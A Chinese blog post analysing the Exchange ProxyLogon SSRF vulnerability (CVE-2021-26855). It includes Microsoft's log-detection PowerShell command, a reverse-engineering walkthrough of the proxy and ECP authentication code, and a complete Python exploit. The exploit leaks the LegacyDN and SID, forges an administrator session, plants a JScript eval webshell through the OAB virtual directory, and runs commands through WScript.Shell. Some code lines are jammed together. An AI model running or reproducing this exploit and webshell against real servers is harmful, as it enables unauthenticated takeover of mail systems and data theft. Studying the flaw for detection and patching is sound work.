# Exchange- (CVE-2021-26855)SSRF 分析 - yourse1f - 博客园

> 原文：[`www.cnblogs.com/-zhong/p/14533053.html`](https://www.cnblogs.com/-zhong/p/14533053.html)

由于之前的 Exc 漏洞都是建立在已经有了身份验证的情况下的，这个 SSRF 的出现改变了这一现状

这是微软发布的 POWERSHELL 检测方法

```
Import-Csv -Path (Get-ChildItem -Recurse -Path "$env:PROGRAMFILES\Microsoft\Exchange Server\V15\Logging\HttpProxy" -Filter '*.log').FullName `
| Where-Object {  $_.AuthenticatedUser -eq '' -and $_.AnchorMailbox -like 'ServerInfo~*/*' } | select DateTime, AnchorMailbox

```

而此漏洞的利用方式有如下

```
1. 通过 SSRF 漏洞攻击，访问 autodiscover.xml 泄露 LegacyDN 信息。 2. 在通过 LegacyDN，获取 SID。 3. 然后通过合法的 SID，获取 exchange 的有效 cookie。 4. 最后通过有效的 cookie，对 OABVirtualDirectory 对象进行恶意操作，写入一句话木马，达到控制目标的效果。
```

这是与漏洞有关的 url

```

/owa/auth/Current/themes/resources/logon.css /owa/auth/Current/themes/resources/... /ecp/default.flt /ecp/main.css /ecp/<single char>.js
```

漏洞点位于"C:\Program Files\Microsoft\ExchangeServer\V15\FrontEnd\HttpProxy\bin" 目录下的"Microsoft.Exchange.FrontEndHttpProxy.dll"。

![](img/64575fa52b0739b228dbb3be97c05302.png)

 从 GetBEResouceCookie 方法可以看见 获取的 cookie 名叫啥和 url 以什么格式结尾

![](img/7cbddad93cbc1b2203b02767d8cce7b0.png)

 ![](img/f2f30d6900dd805b891f4a25f3eee80e.png)

 通过查看看对 BEResourceRequestHandler 的调用发现 SelectHandlerForUnauthenticatedRequest 调用了 BEResourceRequestHandler

![](img/11d09dc2ac2053f41917bf90ea311ae9.png)

 根据此请求发现 url 必须带有 ECP 且以上面图片结尾的后缀，构造 demo

![](img/aafc8597cf127abaa245d884d1b84850.png)

![](img/41ff38cab723eb2c93d41e6b8467464b.png)

只有`ProxyToDownLevel`在`GetTargetBackEndServerUrl`方法中将其设置为 true 时才调用该方法。此方法检查用户是否已通过身份验证，如果未通过验证，则返回 HTTP 401 错误。

幸运的是，我们可以`GetTargetBackEndServerUrl`通过修改 Cookie 中的服务器版本来防止设置此值。如果版本大于`Server.E15MinVersion`，`ProxyToDownLevel`则为 false。进行此更改后，我们成功通过了后端服务（自动发现服务）的身份验证。而这里需要的 version 就是下面通过~分割出来的 version

![](img/97bc70745f7c31c317832471a84e577f.png)

 按照极光无限的步骤 附加进程到 ECPAPPPOOL

![](img/c9b02f854f264177d70d737ec64e94ba.png)

dnSpy 工具附加 MSExchangeECPAppPool 进程后，burpSuite 直接发包后，dnSpy 将会断下，可以看见最后获取的 cookie 值

![](img/09f605b06b71eed4a93f64326f6477b6.png)

BackEndServer.FromString()函数在处理 beresouceCookie 时，以"~"符号作为分隔符，进行提取字符串，然后分别赋值给 fqdn 和 verison 变量

![](img/ea1833ff0466213b6dacf5716488dbf1.png)

 fqdn 和 verison 变量将在 ProxyRequestHandler.BeginProxyRequest 类里的 GetTargetBackEndServerUrl 进行调用。
由于我们能控制 BackEndServer.Fqdn 参数，所以我们就控制了 clientUrlForProxy.Host. 最后重构 url 发送给后端服务器

这里这个 url 的值就是

![](img/e192a56ee29ca7b0be45edf564731e03.png)

 然后把 URL 的值赋予给

![](img/6c6b705beda1fa4dd04dee333733edea.png)

 在进入函数 CreateServerRequest 时，会调用 PrepareServerRequest 进行 uri 代理请求的身份认证判断。（这个认证是判断你

![](img/98a83138db4b0ba354676a4727d0e5fb.png)

 这里有四个判断前三个直接跳过进入最后一个 else![](img/fb6fe8f76104937fb950bf6ca144ff16.png)

 ![](img/2afe1c5b12421ed478b72a279594340c.png)

 最后构造完整 SSRF exp

```

只有 ProxyToDownLevel 在 GetTargetBackEndServerUrl 方法中将其设置为 true 时才调用该方法。此方法检查用户是否已通过身份验证，如果未通过验证，则返回 HTTP 401 错误。

幸运的是，我们可以 GetTargetBackEndServerUrl 通过修改 Cookie 中的服务器版本来防止设置此值。如果版本大于 Server.E15MinVersion，ProxyToDownLevel 则为 false。进行此更改后，我们成功通过了后端服务（自动发现服务）的身份验证

```

![](img/42a1eebb4787ef9d855d089bb367b6f9.png)

有了 SSRF 我们如何继续 第一步想到的肯定是直接用 EXCHANGE 的 kerbros 请求漏洞路径如下，但是这个失败告诉我们此方法肯定不行，那么问题处在哪里呐？

![](img/ecfbe1dfda14ea21076f7bfe398b0337.png)

 我们跟踪 EXP 发现如下 每次攻击时候都使用了 ecp/proxyLogon.ecp 我们并未使用到，那么这个的作用是什么呐？又和这步有什么关系？

![](img/aeb37f762eef9cd9186f775d72f772c5.png)

 ![](img/e3f800119f583faf2aadf859b4c57db1.png)

 ![](img/2f188d23398e164bbebfb93a9da01042.png)

 我们定位 web.config 找到此 url 指向的是 namespace Microsoft.Exchange.Management.ControlPanel dll 跟踪发现此方法会返回一个    this.EcpIdentity 的东西 并且需要传入三个 Header

```
            string logonAccountSddlSid = context.Request.Headers["msExchLogonAccount"]; string text = context.Request.Headers["msExchLogonMailbox"]; string targetMailboxSddlSid = context.Request.Headers["msExchTargetMailbox"];
```

![](img/8f66ac0d4e7bc2a200433323ffc4965d.png)

 那么这三个是必须的吗？

![](img/f6bd978f2f16b2ef379bc94f56321142.png)

 从上面这一步发现 只要"msExchLogonMailbox"不为空那么我们就能进入下一步

![](img/bd5c2577e8a381fa1d04b9c34088680a.png)

 所以进入 EcpLogonInformation identity = EcpLogonInformation.Create(logonAccountSddlSid, text, targetMailboxSddlSid, this.ProxySecurityAccessToken);

![](img/45b6841a76467f257b8e528a00ffd117.png)

 发现

![](img/7ec50b41112900bd03c238e998ab9dbc.png)

 为什么只需要 logonaccountMailbox？

![](img/de990d7245ff11aba4aa39335602659d.png)

那为什么要 POST 一段 xml 数据呐？（我没有理清这里）

![](img/0db6717350370558459dc90cddb8a8ae.png)

 这里我们来看传入 xml 数据后如何对它进行处理的？首先处理 xml 然后是判断是否正常格式，然后返回 token 包括 groupID userid

![](img/b108aa69faa053022006bea4a8378db8.png)

![](img/41ad72415d5fb277c11c9a9d595a8365.png)

 最终构造 exp

```
import requests from urllib3.exceptions import InsecureRequestWarning
import random
import string import sys

def id_generator(size=6, chars=string.ascii_lowercase + string.digits): return ''.join(random.choice(chars) for _ in range(size))

# if len(sys.argv) < 2:
#     print("使用方式: python PoC.py <target> <email>")
#     print("使用方式: python PoC.py mail.btwaf.cn test2@btwaf.cn")
#     exit()

#proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
target = "192.168.1.102"#sys.argv[1]
email = "administrator@7dap.club"#sys.argv[2]
random_name = id_generator(4) + ".js" user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36" shell_path = "Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\test11.aspx" shell_absolute_path = "\\\\127.0.0.1\\c$\\%s" % shell_path

# webshell-马子内容
shell_content = '<script language="JScript" runat="server"> function Page_Load(){/**/eval(Request["code"],"unsafe");}</script>' autoDiscoverBody = """<Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006">
    <Request>
      <EMailAddress>%s</EMailAddress> <AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema>
    </Request>
</Autodiscover>
""" % email
 print("正在获取 Exchange Server " + target+"权限")
print("=============================")
FQDN = "EXCHANGE01" ct = requests.get("https://%s/ecp/%s" % (target, random_name), headers={"Cookie": "X-BEResource=localhost~1942062522", "User-Agent": user_agent},
                  verify=False) if "X-CalculatedBETarget" in ct.headers and "X-FEServer" in ct.headers:
    FQDN = ct.headers["X-FEServer"]

ct = requests.post("https://%s/ecp/%s" % (target, random_name), headers={ "Cookie": "X-BEResource=%s/autodiscover/autodiscover.xml?a=~1942062522;" % FQDN, "Content-Type": "text/xml", "User-Agent": user_agent},
                   data=autoDiscoverBody,

                   verify=False
                   ) if ct.status_code != 200:
    print(ct.status_code)
    print("Autodiscover Error!")
    exit() if "<LegacyDN>" not in str(ct.content):
    print("Can not get LegacyDN!")
    exit()

legacyDn = str(ct.content).split("<LegacyDN>")[1].split(r"</LegacyDN>")[0]
print("Got DN: " + legacyDn)

mapi_body = legacyDn + "\x00\x00\x00\x00\x00\xe4\x04\x00\x00\x09\x04\x00\x00\x09\x04\x00\x00\x00\x00\x00\x00" ct = requests.post("https://%s/ecp/%s" % (target, random_name), headers={ "Cookie": "X-BEResource=Administrator@%s:444/mapi/emsmdb?MailboxId=f26bc937-b7b3-4402-b890-96c46713e5d5@exchange.lab&a=~1942062522;" % FQDN, "Content-Type": "application/mapi-http", "X-Requesttype": "Connect", "X-Clientinfo": "{2F94A2BF-A2E6-4CCCC-BF98-B5F22C542226}", "X-Clientapplication": "Outlook/15.0.4815.1002", "X-Requestid": "{E2EA6C1C-E61B-49E9-9CFB-38184F907552}:123456", "User-Agent": user_agent
},
                   data=mapi_body,
                   verify=False,

                   ) if ct.status_code != 200 or "act as owner of a UserMailbox" not in str(ct.content):
    print("Mapi Error!")
    exit()

sid = str(ct.content).split("with SID ")[1].split(" and MasterAccountSid")[0]

print("Got SID: " + sid)
sid = sid.replace(sid.split("-")[-1],"500")

proxyLogon_request = """<r at="Negotiate" ln="john"><s>%s</s><s a="7" t="1">S-1-1-0</s><s a="7" t="1">S-1-5-2</s><s a="7" t="1">S-1-5-11</s><s a="7" t="1">S-1-5-15</s><s a="3221225479" t="1">S-1-5-5-0-6948923</s></r> """ % sid
 ct = requests.post("https://%s/ecp/%s" % (target, random_name), headers={ "Cookie": "X-BEResource=Administrator@%s:444/ecp/proxyLogon.ecp?a=~1942062522;" % FQDN, "Content-Type": "text/xml", "msExchLogonMailbox": "S-1-5-123", "User-Agent": user_agent
},
                   data=proxyLogon_request,

                   verify=False
                   ) if ct.status_code != 241 or not "set-cookie" in ct.headers:
    print("Proxylogon Error!")
    exit()

sess_id = ct.headers['set-cookie'].split("ASP.NET_SessionId=")[1].split(";")[0]

msExchEcpCanary = ct.headers['set-cookie'].split("msExchEcpCanary=")[1].split(";")[0]
print("Got session id: " + sess_id)
print("Got canary: " + msExchEcpCanary)

ct = requests.post("https://%s/ecp/%s" % (target, random_name), headers={ "Cookie": "X-BEResource=Administrator@%s:444/ecp/DDI/DDIService.svc/GetObject?schema=OABVirtualDirectory&msExchEcpCanary=%s&a=~1942062522; ASP.NET_SessionId=%s; msExchEcpCanary=%s" % (
        FQDN, msExchEcpCanary, sess_id, msExchEcpCanary), "Content-Type": "application/json; ", "msExchLogonMailbox": "S-1-5-20", "User-Agent": user_agent

},
                   json={"filter": { "Parameters": {"__type": "JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel", "SelectedView": "", "SelectedVDirType": "All"}}, "sort": {}},
                   verify=False
                   ) if ct.status_code != 200:
    print("POST  shell:https://"+target+"/owa/auth/7dap.club.aspx")
    #print("GetOAB Error!")
    exit()
oabId = str(ct.content).split('"RawIdentity":"')[1].split('"')[0]
print("Got OAB id: " + oabId)

oab_json = {"identity": {"__type": "Identity:ECP", "DisplayName": "OAB (Default Web Site)", "RawIdentity": oabId}, "properties": { "Parameters": {"__type": "JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel", "ExternalUrl": "http://ffff/#%s" % shell_content}}}

ct = requests.post("https://%s/ecp/%s" % (target, random_name), headers={ "Cookie": "X-BEResource=Administrator@%s:444/ecp/DDI/DDIService.svc/SetObject?schema=OABVirtualDirectory&msExchEcpCanary=%s&a=~1942062522; ASP.NET_SessionId=%s; msExchEcpCanary=%s" % (
        FQDN, msExchEcpCanary, sess_id, msExchEcpCanary), "msExchLogonMailbox": "S-1-5-20", "Content-Type": "application/json; charset=utf-8", "User-Agent": user_agent
},
                   json=oab_json,
                   verify=False
                   ) if ct.status_code != 200:
    print("Set external url Error!")
    exit()

reset_oab_body = {"identity": {"__type": "Identity:ECP", "DisplayName": "OAB (Default Web Site)", "RawIdentity": oabId}, "properties": { "Parameters": {"__type": "JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel", "FilePathName": shell_absolute_path}}}

ct = requests.post("https://%s/ecp/%s" % (target, random_name), headers={ "Cookie": "X-BEResource=Administrator@%s:444/ecp/DDI/DDIService.svc/SetObject?schema=ResetOABVirtualDirectory&msExchEcpCanary=%s&a=~1942062522; ASP.NET_SessionId=%s; msExchEcpCanary=%s" % (
        FQDN, msExchEcpCanary, sess_id, msExchEcpCanary), "msExchLogonMailbox": "S-1-5-20", "Content-Type": "application/json; charset=utf-8", "User-Agent": user_agent
},
                   json=reset_oab_body,
                   verify=False
                   ) if ct.status_code != 200:
    print("False")
    exit()

print("Success!")
print("POST  shell:https://"+target+"/owa/auth/test11.aspx")
shell_url="https://"+target+"/owa/auth/test11.aspx" print('code=Response.Write(new ActiveXObject("WScript.Shell").exec("whoami").StdOut.ReadAll());')
print("get shell")
data=requests.post(shell_url,data={"code":"Response.Write(new ActiveXObject(\"WScript.Shell\").exec(\"whoami\").StdOut.ReadAll());"},verify=False) if data.status_code != 200:
    print("False") else:
    print("shellget"+data.text.split("OAB (Default Web Site)")[0].replace("Name                            : ",""))
```